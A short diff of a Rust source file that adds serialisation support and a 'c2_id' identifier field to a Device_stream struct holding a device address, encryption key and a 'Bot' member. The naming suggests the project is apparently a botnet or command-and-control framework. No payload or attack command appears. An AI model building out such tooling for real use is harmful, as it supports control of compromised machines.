@@ -8,12 +8,15 @@ use std::{
 use serde::{Deserialize, Serialize};
 use rmp_serde::{Deserializer, Serializer};
 
-#[derive(Debug, Clone)]
+use crate::communication::lib;
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct Device_stream {
     pub ip_address: std::net::SocketAddr,
     pub authenticated: bool,
     pub connected: bool,
     pub encryption_key: Vec<u8>,
+    pub c2_id: Vec<u8>,
     pub B: Bot,
 }
 impl Device_stream {
@@ -29,6 +32,7 @@ impl Device_stream {
             authenticated: false,
             connected: true,
             encryption_key: vec![],
+            c2_id: lib::generate_uid(),
             B: B,
         }
     }
